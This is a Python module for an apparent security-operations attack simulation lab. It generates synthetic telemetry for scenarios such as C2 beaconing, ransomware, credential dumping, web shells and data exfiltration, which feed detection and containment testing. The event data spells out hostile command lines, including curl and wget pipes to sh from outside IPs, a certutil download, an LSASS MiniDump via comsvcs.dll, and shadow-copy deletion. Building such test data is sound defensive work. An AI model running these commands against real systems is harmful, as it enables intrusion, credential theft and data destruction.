"""Attack Simulation Lab: synthetic telemetry only (no offensive code, no network activity).

Each scenario returns normalized events whose timestamps end "now", so they
flow through exactly the same ingest -> detect -> decide -> contain path as
real telemetry arriving from EDR / NDR / firewall / identity connectors.
"""
from __future__ import annotations

import random
import string
from datetime import datetime, timedelta, timezone

from ..engines.types import Event
from . import seed_data


def ev_(ts, source, event_type, src_ip, hostname, data, **kw) -> Event:
    return Event(ts=ts, source=source, event_type=event_type, src_ip=src_ip, hostname=hostname, data=data, **kw)


def _now() -> datetime:
    return datetime.now(timezone.utc)


def _conn(ts, src, source, dest_ip, port, host=None, process=None, bytes_out=2048) -> Event:
    data = {"dest_ip": dest_ip, "dest_port": port, "bytes_out": bytes_out}
    if process:
        data["process"] = process
    return Event(ts=ts, source=source, event_type="net_conn", src_ip=src, hostname=host, data=data)


def c2_hr() -> list[Event]:
    """Reference scenario from the design: HR-APP-01 beaconing to an external IP on port 4444."""
    ip, host, c2 = "10.20.1.11", "HR-APP-01", "185.220.101.47"
    now = _now()
    ev = [ev_(now - timedelta(minutes=23), "edr", "process", ip, host,
                {"process": "powershell.exe", "parent": "w3wp.exe",
                 "cmdline": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi...", "network": True})]
    for i in range(22):  # beacon every ~60 s
        ev.append(_conn(now - timedelta(seconds=60 * (22 - i) + random.uniform(-1.5, 1.5)), ip, "ndr", c2, 4444))
    for i in range(4):
        t = now - timedelta(seconds=40 * i + 5)
        ev.append(_conn(t, ip, "firewall", c2, 4444))
        ev.append(_conn(t, ip, "edr", c2, 4444, host, "powershell.exe"))
    ev.append(_conn(now - timedelta(minutes=10), ip, "firewall", "10.20.2.21", 1433))   # HR-DB-01
    ev.append(_conn(now - timedelta(minutes=8), ip, "firewall", "10.20.3.40", 443))     # HR-API-GW
    ev.append(ev_(now - timedelta(seconds=30), "threat_intel", "ti_match", ip, host,
                    {"indicator": c2, "confidence": 92, "feed": "MISP: C2 infrastructure", "mitre": ["T1071"]}))
    ev.append(ev_(now - timedelta(seconds=20), "ueba", "ueba_anomaly", ip, host,
                    {"metric": "outbound connections to new external IPs", "sigma": 4.2}))
    return ev


def ransomware_finance() -> list[Event]:
    """Three Finance workstations hit in quick succession -> fast path + segment restriction."""
    now = _now()
    ev = []
    for n, (ip, host) in enumerate([("10.40.5.23", "WS-FIN-023"), ("10.40.5.31", "WS-FIN-031"),
                                    ("10.40.5.44", "WS-FIN-044")]):
        t = now - timedelta(seconds=30 - n * 5)
        ev.append(ev_(t - timedelta(seconds=20), "edr", "process", ip, host,
                        {"process": "vssadmin.exe", "parent": "cmd.exe", "cmdline": "vssadmin delete shadows /all /quiet"}))
        ev.append(ev_(t, "edr", "file_activity", ip, host, {"renames": 450, "extension": ".lockbit"}))
        if n == 0:
            for k in range(12):
                ev.append(_conn(t - timedelta(seconds=k), ip, "firewall", f"10.40.5.{100 + k}", 445))
    return ev


def erp_false_positive() -> list[Event]:
    """New vendor sync agent on ERP-PROD-01 looks like exfiltration. Designed to be rolled back as FP."""
    ip, host, dest = "10.30.1.10", "ERP-PROD-01", "52.94.12.80"
    now = _now()
    ev = []
    for i in range(3):
        t = now - timedelta(seconds=60 * i + 10)
        ev.append(_conn(t, ip, "firewall", dest, 9001))
        ev.append(_conn(t, ip, "ndr", dest, 9001, bytes_out=220 * 1024 * 1024))
        ev.append(_conn(t, ip, "edr", dest, 9001, host, "vendorsync.exe"))
    ev.append(ev_(now - timedelta(seconds=5), "threat_intel", "ti_match", ip, host,
                    {"indicator": dest, "confidence": 75, "feed": "Newly observed IP", "mitre": []}))
    ev.append(ev_(now - timedelta(seconds=4), "ueba", "ueba_anomaly", ip, host,
                    {"metric": "outbound bytes per hour", "sigma": 3.5}))
    return ev


def tier0_dc() -> list[Event]:
    """Credential dumping on a Domain Controller: restrictive actions only + two-person approval."""
    ip, host, dest = "10.10.0.5", "DC-01", "45.9.148.3"
    now = _now()
    ev = [
        ev_(now - timedelta(seconds=90), "edr", "process", ip, host,
              {"process": "rundll32.exe", "parent": "cmd.exe",
               "cmdline": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full",
               "network": True}),
        ev_(now - timedelta(seconds=85), "edr", "lsass_access", ip, host, {"process": "rundll32.exe"}),
    ]
    for i in range(3):
        t = now - timedelta(seconds=30 * i + 5)
        ev.append(_conn(t, ip, "firewall", dest, 8888))
        ev.append(_conn(t, ip, "edr", dest, 8888, host, "rundll32.exe"))
        ev.append(_conn(t, ip, "ndr", dest, 8888))
    ev.append(ev_(now - timedelta(seconds=3), "threat_intel", "ti_match", ip, host,
                    {"indicator": dest, "confidence": 88, "feed": "OpenCTI: exfil staging", "mitre": ["T1041"]}))
    ev.append(ev_(now - timedelta(seconds=2), "ueba", "ueba_anomaly", ip, host,
                    {"metric": "first-ever internet egress from a DC", "sigma": 4.5}))
    return ev


def cloud_api_gateway() -> list[Event]:
    """AWS workload: LOLBin + C2 + IAM persistence -> surgical isolation with SG swap and IAM deny."""
    ip, host, dest = "172.31.10.5", "API-GW-AWS-01", "91.215.85.14"
    now = _now()
    ev = [
        ev_(now - timedelta(seconds=120), "edr", "process", ip, host,
              {"process": "curl", "parent": "node", "cmdline": "curl -s http://91.215.85.14/x | sh",
               "network": True}),
        ev_(now - timedelta(seconds=60), "cloud", "cloud_api", ip, host,
              {"api": "CreateAccessKey", "principal": "role/api-gw-instance", "in_change_window": False}),
    ]
    for i in range(3):
        t = now - timedelta(seconds=20 * i + 3)
        ev.append(_conn(t, ip, "firewall", dest, 4444))
        ev.append(_conn(t, ip, "ndr", dest, 4444))
    ev.append(ev_(now - timedelta(seconds=2), "threat_intel", "ti_match", ip, host,
                    {"indicator": dest, "confidence": 85, "feed": "MISP: loader infrastructure", "mitre": ["T1105"]}))
    ev.append(ev_(now - timedelta(seconds=2), "ueba", "ueba_anomaly", ip, host,
                    {"metric": "IAM API calls by instance role", "sigma": 5.1}))
    return ev


def medical_device() -> list[Event]:
    """Legacy MRI controller that cannot be isolated: network allowlist only."""
    ip, dest = "10.60.3.8", "193.42.33.7"
    now = _now()
    ev = []
    for i in range(4):
        t = now - timedelta(seconds=45 * i + 5)
        ev.append(_conn(t, ip, "firewall", dest, 4444))
        ev.append(_conn(t, ip, "ndr", dest, 4444))
    ev.append(ev_(now - timedelta(seconds=3), "threat_intel", "ti_match", ip, None,
                    {"indicator": dest, "confidence": 90, "feed": "MISP: botnet C2", "mitre": ["T1071"]}))
    ev.append(ev_(now - timedelta(seconds=2), "ueba", "ueba_anomaly", ip, None,
                    {"metric": "first-ever internet egress", "sigma": 4.0}))
    return ev


def unknown_host() -> list[Event]:
    """Rogue device not in CMDB: restrict by IP, analyst review."""
    ip, dest = "10.77.7.7", "185.100.87.202"
    now = _now()
    ev = []
    for i in range(3):
        t = now - timedelta(seconds=30 * i + 5)
        ev.append(_conn(t, ip, "firewall", dest, 1337))
        ev.append(_conn(t, ip, "ndr", dest, 1337))
    return ev


def dns_tunnel_workstation() -> list[Event]:
    ip, host = "10.40.5.31", "WS-FIN-031"
    now = _now()
    ev = []
    for i in range(120):
        label = "".join(random.choices(string.ascii_lowercase + string.digits, k=58))
        ev.append(ev_(now - timedelta(seconds=25 * i), "dns", "dns_query", ip, host,
                        {"query": f"{label}.t.exfil-cdn.net"}))
    for i in range(3):
        ev.append(_conn(now - timedelta(seconds=10 * i), ip, "firewall", "46.8.19.33", 8888))
    return ev




def ws_c2_tier2() -> list[Event]:
    """Tier-2 workstation with a LOLBin callback: full automation, no human involved."""
    ip, host, c2 = "10.40.6.11", "WS-HR-011", "185.220.101.47"
    now = _now()
    ev = [ev_(now - timedelta(seconds=50), "edr", "process", ip, host,
              {"process": "mshta.exe", "parent": "outlook.exe", "cmdline": "mshta.exe https://cdn-invoice.example/x.hta",
               "network": True}, user="h.saleh", process_hash="9f2c1e7a")]
    for i in range(3):
        t = now - timedelta(seconds=20 * i + 4)
        ev.append(_conn(t, ip, "firewall", c2, 4444))
        ev.append(_conn(t, ip, "edr", c2, 4444, host, "mshta.exe"))
        ev.append(_conn(t, ip, "ndr", c2, 4444))
    for n, peer in enumerate(("10.40.1.20", "10.40.1.21", "10.40.1.22")):
        ev.append(_conn(now - timedelta(seconds=30 + n), ip, "firewall", peer, 445))
    ev.append(ev_(now - timedelta(seconds=3), "threat_intel", "ti_match", ip, host,
                  {"indicator": c2, "confidence": 90, "feed": "MISP: C2 infrastructure", "mitre": ["T1071"]}))
    return ev


def erp_change_window() -> list[Event]:
    """ERP-PROD-01 during an approved change: vendor sync agent looks like exfiltration (no UEBA deviation)."""
    return [e for e in erp_false_positive() if e.event_type != "ueba_anomaly"]



# ---------------------------------------------------------------- composable parts (Attack Simulation Lab)
# Each part returns synthetic events for (ip, host, now). Scenarios are lists of parts.

def p_proc(proc, parent, cmd="", user=None, age=90):
    def f(ip, host, now):
        return [ev_(now - timedelta(seconds=age), "edr", "process", ip, host,
                    {"process": proc, "parent": parent, "cmdline": cmd or proc, "network": True}, user=user)]
    return f


def p_c2(dest, port, sources=("firewall", "edr", "ndr"), n=3, proc=None):
    def f(ip, host, now):
        out = []
        for i in range(n):
            t = now - timedelta(seconds=20 * i + 4)
            for src in sources:
                out.append(_conn(t, ip, src, dest, port, host if src == "edr" else None,
                                 proc if src == "edr" else None))
        return out
    return f


def p_beacon(dest, port=443, n=24, interval=60, source="ndr"):
    def f(ip, host, now):
        return [_conn(now - timedelta(seconds=interval * i + 2 + (i % 3)), ip, source, dest, port) for i in range(n)]
    return f


def p_ti(dest, conf, feed, mitre=("T1071",)):
    def f(ip, host, now):
        return [ev_(now - timedelta(seconds=3), "threat_intel", "ti_match", ip, host,
                    {"indicator": dest, "confidence": conf, "feed": feed, "mitre": list(mitre)})]
    return f


def p_ueba(metric, sigma):
    def f(ip, host, now):
        return [ev_(now - timedelta(seconds=2), "ueba", "ueba_anomaly", ip, host, {"metric": metric, "sigma": sigma})]
    return f


def p_lsass(proc="rundll32.exe"):
    def f(ip, host, now):
        return [ev_(now - timedelta(seconds=80), "edr", "lsass_access", ip, host, {"process": proc})]
    return f


def p_ransom(renames=900, shadow=True):
    def f(ip, host, now):
        out = [ev_(now - timedelta(seconds=10), "edr", "file_activity", ip, host,
                   {"renames": renames, "extension": ".locked", "process": "svch0st.exe"})]
        if shadow:
            out.append(ev_(now - timedelta(seconds=12), "edr", "process", ip, host,
                           {"process": "vssadmin.exe", "parent": "cmd.exe", "cmdline": "vssadmin delete shadows /all /quiet"}))
        return out
    return f


def p_exfil(dest, mb=800, source="firewall"):
    def f(ip, host, now):
        return [_conn(now - timedelta(seconds=40 * i + 5), ip, source, dest, 443, bytes_out=mb * 1024 * 1024 // 4)
                for i in range(4)]
    return f


def p_dns(domain, n=120):
    def f(ip, host, now):
        rnd = random.Random(domain)
        return [ev_(now - timedelta(seconds=20 * i), "dns", "dns_query", ip, host,
                    {"query": "".join(rnd.choices(string.ascii_lowercase + string.digits, k=58)) + "." + domain})
                for i in range(n)]
    return f


def p_travel(user, first="KW", second="BR"):
    def f(ip, host, now):
        return [ev_(now - timedelta(seconds=1500), "identity", "signin", ip, host,
                    {"user": user, "country": first, "device_id": "dev-known"}, user=user),
                ev_(now - timedelta(seconds=60), "identity", "signin", ip, host,
                    {"user": user, "country": second, "device_id": "dev-new"}, user=user)]
    return f


def p_cloud(api="CreateAccessKey", principal="role/app-instance"):
    def f(ip, host, now):
        return [ev_(now - timedelta(seconds=50), "cloud", "cloud_api", ip, host,
                    {"api": api, "principal": principal, "in_change_window": False})]
    return f


def p_lateral(n=12, port=445, base="10.40.5."):
    def f(ip, host, now):
        return [_conn(now - timedelta(seconds=5 + i), ip, "firewall", f"{base}{100 + i}", port) for i in range(n)]
    return f


def p_peers(peers, port=445):
    def f(ip, host, now):
        return [_conn(now - timedelta(seconds=30 + n), ip, "firewall", p, port) for n, p in enumerate(peers)]
    return f


def p_edr_host(other_hostname):
    """EDR reports a different hostname than the CMDB (attribution conflict)."""
    def f(ip, host, now):
        return [ev_(now - timedelta(seconds=70), "edr", "process", ip, other_hostname,
                    {"process": "powershell.exe", "parent": "explorer.exe", "cmdline": "powershell -enc SQBFAFgA",
                     "network": True})]
    return f


HOSTS = {h: (ip, h) for h, ip, *_ in seed_data.ASSETS}


def composed(host: str, *parts):
    def gen() -> list[Event]:
        ip, h = HOSTS[host]
        now = _now()
        return [e for part in parts for e in part(ip, h, now)]
    gen.__doc__ = f"Composed scenario on {host}"
    return gen


def _sc(cat, ar, en, fn, failure="integration_down", edge=None):
    return {"category": cat, "title_ar": ar, "title_en": en, "fn": fn, "failure": failure, "edge": edge}


C2_A, C2_B, C2_C, C2_D, C2_E = "185.220.101.47", "45.9.148.3", "91.215.85.14", "193.42.33.7", "185.100.87.202"

COMPOSED: dict[str, dict] = {
    # Network / C2
    "beacon_hr_app2": _sc("network_c2", "Beaconing منتظم من HR-APP-02", "Regular beaconing from HR-APP-02",
        composed("HR-APP-02", p_beacon(C2_D, 443), p_c2(C2_D, 8888, ("firewall", "edr"), proc="rundll32.exe"),
                 p_proc("rundll32.exe", "services.exe"), p_ti(C2_D, 86, "MISP: botnet C2"))),
    "c2_build_server": _sc("network_c2", "اتصال C2 من خادم البناء", "C2 callback from the build server",
        composed("DEV-BUILD-07", p_proc("curl", "bash", "curl -s http://91.215.85.14/s | sh"),
                 p_c2(C2_C, 4444, proc="curl"), p_ti(C2_C, 85, "MISP: loader infrastructure", ("T1105",)))),
    "vpn_gateway_c2": _sc("network_c2", "C2 من بوابة VPN بدون EDR", "C2 from a VPN gateway without EDR",
        composed("VPN-GW-01", p_c2(C2_E, 1337, ("firewall", "ndr")), p_ti(C2_E, 80, "OpenCTI: scanner / C2"),
                 p_ueba("egress from appliance management plane", 4.2))),
    "c2_ws_fin023": _sc("network_c2", "C2 عبر PowerShell من محطة مالية", "PowerShell C2 from a finance workstation",
        composed("WS-FIN-023", p_proc("powershell.exe", "explorer.exe", "powershell -enc SQBFAFgA"),
                 p_c2(C2_A, 4444, proc="powershell.exe"), p_ti(C2_A, 92, "MISP: C2 infrastructure"))),
    # Identity
    "impossible_travel_hr": _sc("identity", "دخول مستحيل جغرافيًا لموظف HR", "Impossible travel for an HR user",
        composed("WS-HR-011", p_travel("h.saleh"), p_ueba("sign-in from new country and device", 3.4)), None),
    "dc02_lsass_single": _sc("identity", "وصول إلى LSASS على DC-02 من مصدر واحد", "LSASS access on DC-02, single source",
        composed("DC-02", p_proc("rundll32.exe", "cmd.exe", "rundll32 comsvcs.dll MiniDump"), p_lsass()), None),
    "pki_c2": _sc("identity", "C2 من خادم الشهادات PKI", "C2 from the PKI certificate authority",
        composed("PKI-CA-01", p_proc("certutil.exe", "cmd.exe", "certutil -urlcache -f http://45.9.148.3/a"),
                 p_c2(C2_B, 8888, proc="certutil.exe"), p_ti(C2_B, 90, "OpenCTI: exfil staging", ("T1105",)),
                 p_ueba("first-ever internet egress from PKI", 5.0))),
    "travel_then_c2_ws044": _sc("identity", "دخول مستحيل يتبعه C2", "Impossible travel followed by C2",
        composed("WS-FIN-044", p_travel("m.ali", "KW", "NG"), p_c2(C2_A, 4444, ("firewall", "ndr")),
                 p_ti(C2_A, 91, "MISP: C2 infrastructure"))),
    # Ransomware
    "ransomware_ws_hr": _sc("ransomware", "Ransomware على محطة HR", "Ransomware on an HR workstation",
        composed("WS-HR-011", p_ransom(1200, True))),
    "ransomware_build": _sc("ransomware", "حذف Shadow Copies على خادم البناء", "Shadow copy deletion on the build server",
        composed("DEV-BUILD-07", p_ransom(0, True))),
    "ransomware_erp_db": _sc("ransomware", "Ransomware على قاعدة بيانات ERP", "Ransomware on the ERP database",
        composed("ERP-DB-01", p_ransom(700, True))),
    "ransomware_dc02": _sc("ransomware", "Ransomware على Domain Controller", "Ransomware on a Domain Controller",
        composed("DC-02", p_ransom(400, True))),
    # Cloud / K8s
    "k8s_node_miner": _sc("cloud_k8s", "تعدين عملات على عقدة Kubernetes", "Cryptominer on a Kubernetes node",
        composed("K8S-NODE-04", p_proc("curl", "containerd-shim", "curl -s http://193.42.33.7/xmr | sh"),
                 p_c2(C2_D, 31337, proc="curl"), p_ti(C2_D, 84, "MISP: mining pool proxy", ("T1496",)))),
    "k8s_cp_c2": _sc("cloud_k8s", "C2 من Control Plane", "C2 from the Kubernetes control plane",
        composed("K8S-CP-01", p_proc("curl", "kube-apiserver", "curl http://185.220.101.47/k"),
                 p_c2(C2_A, 4444, proc="curl"), p_ti(C2_A, 93, "MISP: C2 infrastructure"),
                 p_ueba("control plane egress to the internet", 5.5))),
    "aws_access_key_only": _sc("cloud_k8s", "إنشاء Access Key مشبوه فقط", "Suspicious access key creation only",
        composed("API-GW-AWS-01", p_cloud("CreateAccessKey", "role/api-gw-instance")), "gate_fail"),
    "aws_gw_exfil": _sc("cloud_k8s", "تسريب بيانات من Workload سحابي", "Data exfiltration from a cloud workload",
        composed("API-GW-AWS-01", p_exfil(C2_B, 900, "ndr"), p_c2(C2_B, 9001, ("firewall", "ndr")),
                 p_ti(C2_B, 88, "OpenCTI: exfil staging", ("T1041",))), "gate_fail"),
    # Initial access
    "phishing_macro_fin023": _sc("initial_access", "ماكرو من مرفق بريد", "Macro from an email attachment",
        composed("WS-FIN-023", p_proc("powershell.exe", "winword.exe", "powershell -enc JABjAD0A"),
                 p_c2(C2_A, 4444, proc="powershell.exe"), p_ti(C2_A, 92, "MISP: C2 infrastructure", ("T1566",)))),
    "phishing_hta_fin044": _sc("initial_access", "ملف HTA من Outlook", "HTA payload launched from Outlook",
        composed("WS-FIN-044", p_proc("mshta.exe", "outlook.exe", "mshta https://cdn-invoice.example/x.hta"),
                 p_c2(C2_E, 1337, proc="mshta.exe"), p_ti(C2_E, 82, "OpenCTI: scanner / C2", ("T1566",)))),
    "outlook_cmd_fin031": _sc("initial_access", "أمر من Outlook إلى الإنترنت", "Command shell from Outlook to the internet",
        composed("WS-FIN-031", p_proc("cmd.exe", "outlook.exe", "cmd /c certutil -urlcache"),
                 p_c2(C2_C, 8888, proc="cmd.exe"), p_ti(C2_C, 86, "MISP: loader infrastructure", ("T1566",)),
                 p_peers(["10.40.1.20", "10.40.1.21", "10.40.1.22"]))),
    "vpn_credential_abuse": _sc("initial_access", "بيانات VPN مسروقة", "Stolen VPN credentials",
        composed("VPN-GW-01", p_travel("svc.vpn", "KW", "RU"), p_ueba("VPN session volume", 3.8),
                 p_ti(C2_B, 75, "OpenCTI: exfil staging")), None),
    # Web / API
    "webshell_hr_gateway": _sc("web_api", "Web Shell على بوابة HR API", "Web shell on the HR API gateway",
        composed("HR-API-GW", p_proc("powershell.exe", "w3wp.exe", "powershell -enc aQBlAHgA"),
                 p_c2(C2_A, 4444, proc="powershell.exe"), p_ti(C2_A, 92, "MISP: C2 infrastructure", ("T1505.003",)))),
    "fin_api_rce": _sc("web_api", "تنفيذ أوامر عن بُعد في FIN-API", "Remote code execution in FIN-API",
        composed("FIN-API-01", p_proc("curl", "java", "curl http://91.215.85.14/p | sh"),
                 p_c2(C2_C, 4444, proc="curl"), p_ti(C2_C, 85, "MISP: loader infrastructure", ("T1190",)),
                 p_ueba("outbound calls from API tier", 4.4))),
    "aws_gw_node_exploit": _sc("web_api", "استغلال تطبيق Node في AWS", "Node.js exploit on the AWS gateway",
        composed("API-GW-AWS-01", p_proc("wget", "node", "wget http://193.42.33.7/b -O- | sh"),
                 p_c2(C2_D, 8888, proc="wget"), p_ti(C2_D, 87, "MISP: botnet C2", ("T1190",)),
                 p_ueba("new outbound destination", 4.8))),
    "hr_app2_webshell": _sc("web_api", "Web Shell على HR-APP-02", "Web shell on HR-APP-02",
        composed("HR-APP-02", p_proc("cmd.exe", "w3wp.exe", "cmd /c whoami & powershell -enc"),
                 p_c2(C2_E, 1337, proc="cmd.exe"), p_ti(C2_E, 83, "OpenCTI: scanner / C2", ("T1505.003",)),
                 p_ueba("IIS worker spawning shells", 5.2))),
    "erp_web_exploit_cw": _sc("web_api", "استغلال ERP أثناء Change Window", "ERP exploit during a change window",
        composed("ERP-PROD-01", p_proc("sh", "java", "sh -c curl"), p_c2(C2_C, 9001, ("firewall", "ndr")),
                 p_ti(C2_C, 85, "MISP: loader infrastructure", ("T1190",)),
                 p_ueba("process tree outside change baseline", 4.6)), None),
    # Data / insider
    "erp_db_exfil": _sc("data_insider", "تسريب كبير من قاعدة ERP", "Bulk exfiltration from the ERP database",
        composed("ERP-DB-01", p_exfil(C2_B, 1200), p_c2(C2_B, 9001, ("firewall", "ndr")),
                 p_ti(C2_B, 90, "OpenCTI: exfil staging", ("T1041",)), p_ueba("database egress volume", 6.0))),
    "hr_db_exfil": _sc("data_insider", "تسريب بيانات الموظفين", "Employee data exfiltration",
        composed("HR-DB-01", p_exfil(C2_B, 700, "ndr"), p_c2(C2_B, 8888, ("firewall", "ndr")),
                 p_ti(C2_B, 89, "OpenCTI: exfil staging", ("T1041",)))),
    "insider_dns_ws044": _sc("data_insider", "DNS Tunneling من موظف", "Insider DNS tunneling",
        composed("WS-FIN-044", p_dns("q.sync-telemetry.net"), p_ueba("DNS volume", 3.6)), None),
    # Edge cases
    "response_memory_repeat": _sc("edge_cases", "تكرار نمط استجابة معتمد (≥96%)", "Repeat of an approved response pattern (>=96%)",
        composed("WS-FIN-031", p_dns("t.exfil-cdn.net"), p_c2("46.8.19.33", 8888, ("firewall",))), None, 10),
    "attribution_conflict": _sc("edge_cases", "تعارض في تحديد الجهاز", "Asset attribution conflict",
        composed("HR-APP-01", p_edr_host("HR-APP-99"), p_c2(C2_A, 4444, ("firewall", "ndr")),
                 p_ti(C2_A, 92, "MISP: C2 infrastructure")), None),
}
# id -> (category, title_ar, title_en, generator, default failure mode, spec edge case #)
LEGACY: dict[str, dict] = {
    "tier1_c2_hr": {"category": "network_c2", "title_ar": "C2 من خادم HR (Tier-1)",
                    "title_en": "C2 from HR server (Tier-1)", "fn": c2_hr, "failure": "integration_down", "edge": 8},
    "tier0_dc_cred_dump": {"category": "identity", "title_ar": "سرقة Credentials من Domain Controller",
                           "title_en": "Credential dumping on a Domain Controller", "fn": tier0_dc,
                           "failure": "integration_down", "edge": 7},
    "tier2_workstation": {"category": "initial_access", "title_ar": "محطة عمل Tier-2 بدون تدخل بشري",
                          "title_en": "Tier-2 workstation, no human needed", "fn": ws_c2_tier2,
                          "failure": "integration_down", "edge": 9},
    "ransomware_finance": {"category": "ransomware", "title_ar": "Ransomware في أجهزة المالية",
                           "title_en": "Ransomware on Finance workstations", "fn": ransomware_finance,
                           "failure": "integration_down", "edge": 6},
    "erp_change_window_fp": {"category": "edge_cases", "title_ar": "إيجابية كاذبة داخل Change Window (ERP)",
                             "title_en": "False positive inside a change window (ERP)", "fn": erp_change_window,
                             "failure": None, "edge": 2},
    "mri_non_isolatable": {"category": "edge_cases", "title_ar": "جهاز طبي غير قابل للعزل",
                           "title_en": "Non-isolatable medical device", "fn": medical_device,
                           "failure": None, "edge": 1},
    "cloud_workload": {"category": "cloud_k8s", "title_ar": "اختراق Workload في AWS",
                       "title_en": "Compromised AWS workload", "fn": cloud_api_gateway,
                       "failure": "gate_fail", "edge": 4},
    "ioc_return_hr": {"category": "network_c2", "title_ar": "عودة IoB أثناء نافذة المراقبة",
                      "title_en": "IoB returns during the observation window", "fn": c2_hr,
                      "failure": "ioc_return", "edge": 5},
    "unknown_host": {"category": "edge_cases", "title_ar": "جهاز غير مسجل في CMDB",
                     "title_en": "Device not in the CMDB", "fn": unknown_host, "failure": None, "edge": None},
    "dns_tunnel": {"category": "data_insider", "title_ar": "DNS Tunneling منخفض الثقة",
                   "title_en": "Low-confidence DNS tunneling", "fn": dns_tunnel_workstation,
                   "failure": None, "edge": None},
}


SCENARIOS: dict[str, dict] = {**LEGACY, **COMPOSED}
CATEGORIES = ["network_c2", "identity", "ransomware", "cloud_k8s", "initial_access", "web_api", "data_insider",
              "edge_cases"]
FAILURE_MODES = ("integration_down", "gate_fail", "ioc_return")


def build(scenario_id: str, mode: str = "success", failure: str | None = None) -> tuple[list[Event], dict]:
    """Return (events, simulation profile). mode=failure applies the scenario's default failure."""
    sc = SCENARIOS[scenario_id]
    fail = None
    if scenario_id == "ioc_return_hr" and mode != "failure":
        fail = "ioc_return"
    if mode == "failure":
        fail = failure or sc["failure"] or "integration_down"
    if fail and fail not in FAILURE_MODES:
        raise ValueError(f"unknown failure mode {fail}")
    return sc["fn"](), {"scenario": scenario_id, "mode": mode, "failure": fail}


_TARGETS: dict[str, str] = {}
_BY_IP = {ip: h for h, ip, *_ in seed_data.ASSETS}


def target(scenario_id: str) -> str:
    """Hostname(s) a scenario hits (computed once)."""
    if scenario_id not in _TARGETS:
        ips = sorted({e.src_ip for e in SCENARIOS[scenario_id]["fn"]()})
        _TARGETS[scenario_id] = ", ".join(_BY_IP.get(ip, ip) for ip in ips)
    return _TARGETS[scenario_id]
